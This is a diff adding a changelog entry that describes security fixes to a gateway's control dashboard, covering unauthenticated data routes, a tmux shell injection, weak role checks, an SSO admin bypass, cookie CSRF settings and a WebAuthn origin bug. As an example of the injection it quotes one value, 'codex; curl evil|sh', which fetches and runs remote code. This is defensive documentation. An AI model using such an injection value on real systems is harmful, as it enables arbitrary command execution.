@@ -1,5 +1,40 @@
 # Changelog
 
+## fix(ucc): security hardening — auth-gate the dashboard reads, close the tmux shell injection, enforce RBAC
+Completed: 2026-07-03
+
+Owner was about to link the UCC's tailnet URL from busi's public "IT Consulting" site and asked for a
+security check first. A static review of `crates/rozum-gateway/src/control.rs` found the control center
+was not safe to expose more widely. Fixed:
+- **Unauthenticated data leak**: `/control/status`, `/chat/messages`, `/chat/incidents`, and the
+  non-token-gated `/control/matrix/status|log|cell|live` were fully public — live coder workdirs/task
+  prompts, terminal session ids, and full chat transcripts, no login required. Moved behind a new
+  `require_perm_read` middleware; the admin-issued view-token routes (`/control/public/matrix*`,
+  `/view/{token}`) are unaffected (they were already correctly scoped).
+- **Shell command injection**: `session_launch_route` built a `tmux new-session` shell-command string by
+  interpolating the request's `agent`/`model` fields unsanitized — any authenticated user could inject
+  arbitrary commands (e.g. `agent: "codex; curl evil|sh"`). New `shell_safe()` charset check rejects
+  anything outside `[A-Za-z0-9\-_./:@+]` before the string is built.
+- **Decorative RBAC**: only `/control/admin/*` checked `require_admin`; every other protected route
+  accepted any authenticated session regardless of role, so a `readonly` user could launch sessions/coders
+  and attach the live terminal. Split into `chat`/`agents`/`matrix`/`projects` permission-scoped
+  sub-routers, matching the existing `default_roles()` permission sets.
+- **`busi-sso` full-admin bypass**: `user_has_perm` unconditionally returned `true` for any device paired
+  to the separate busi app. Now maps to the `operator` permission set (read/chat/agents/matrix/projects),
+  not admin.
+- **CSRF exposure**: session cookie was `SameSite=None` (no CSRF token) — tightened to `SameSite=Lax`
+  (SPA+API are same-origin, so nothing is lost) to stop it riding along on a cross-site POST.
+- **Bonus fix**: `rp_origin()` defaulted to a stale `:8447` from the old two-port SPA/API split; the
+  current single-port deployment is `:8448` and no launchd env override exists, so every WebAuthn
+  ceremony's origin check was silently failing against the live origin. Fixed the default (+ the same
+  stale port in `clients/meeting/meeting.ssc`'s 🎛 toolbar link).
+
+Deferred: first-registration TOFU race (only matters at first deploy / after a full credential wipe;
+tailnet-only reachability already narrows it) — documented in SPRINT, not fixed.
+
+`cargo build --workspace` clean; `cargo test -p rozum-gateway` 94 passed (3 new: `shell_safe_*`,
+`busi_sso_gets_operator_perms_not_admin`); live-smoke-tested the router on a throwaway port/HOME.
+
 ## chore(bench): close verify-pipelines — green-matrix-min-footprint goal achieved by standalones
 Completed: 2026-07-03
 
